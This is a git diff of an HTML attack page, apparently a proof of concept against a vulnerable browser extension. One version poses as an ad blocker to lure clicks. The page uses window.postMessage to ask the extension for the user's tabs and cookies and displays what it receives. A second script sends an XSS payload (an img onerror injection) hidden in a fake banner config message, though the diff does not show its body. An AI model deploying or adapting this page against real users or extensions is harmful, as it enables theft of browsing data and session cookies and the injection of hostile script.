@@ -3,17 +3,17 @@
 
 <head>
   <meta charset="utf-8">
-  <title>A good addblocker bro</title>
+  <title>evilwebsite</title>
 </head>
 
 <body>
-  <h1>Addblocker 2.trustmebro</h1>
+  <h1>evilwebsite</h1>
 
   <button onclick="requestStolenData()">Click to activate remove ads forever</button>
 
 
-  <div class="status" id="status">Status of the best addblocker</div>
-  <pre id="result">Plz click brother I need to load...</pre>
+  <div class="status" id="status"></div>
+  <pre id="result">..</pre>
 
   <script>
     const statusEl = document.getElementById('status');
@@ -27,56 +27,37 @@
     }
 
     function requestStolenData() {
-      statusEl.textContent = "Activating adblocker";
-      statusEl.className = 'status';
-      resultEl.textContent = "Removing ads\n";
 
-      // Send request
-      window.postMessage({type: "REQUEST_STOLEN_DATA"}, "*");
+      window.postMessage({type: "givemedata"}, "*");
 
-      // Set timeout in case no response comes
+
       clearTimeout(responseTimeout);
       responseTimeout = setTimeout(() => {
-        log("Why did you not download my adblocker?!?!?! 😡😡😡😡😡", true);
-      }, 4000); // 4 seconds timeout
+        log("didnt work", true);
+      }, 1000);
     }
 
-    function simulateActivity() {
-      localStorage.setItem("sessionToken", "super-secret-token-xyz123");
-      statusEl.textContent = "✅ Simulated login done";
-    }
-
-    // Receive data from content script
     window.addEventListener("message", (event) => {
-      if (event.data.type === "STOLEN_DATA_RESPONSE") {
-        clearTimeout(responseTimeout); // Cancel timeout
+      if (event.data.type === "givemedata") {
+        clearTimeout(responseTimeout);
 
         const data = event.data.data || {};
 
         if (data.error) {
           log("Extension Error: " + data.error, true);
         } else if (data.tabs || data.cookiesCount !== undefined) {
-          statusEl.textContent = "Trust me I need these information to do addblock 😈😈😈";
+          statusEl.textContent = "gotem";
           resultEl.textContent = JSON.stringify(data, null, 2);
-        } else {
-          log("⚠️ Received empty or invalid data from extension", true);
         }
       }
     });
 
-    // Optional: Auto try once when page loads
-    window.onload = () => {
-      setTimeout(() => {
-        // You can remove this if you don't want auto-request
-        // requestStolenData();
-      }, 800);
-    };
   </script>
   <script>
     {
       setTimeout(() => {
         window.postMessage({
-          type: "SET_CONFIG",
+          type: "rick",
           config: {
             showBanner: `
           <img src="x" onerror="
@@ -94,7 +75,7 @@
         `
           }
         }, "*");
-      }, 2000);
+      }, 10000);
     }
   </script>
 </body>
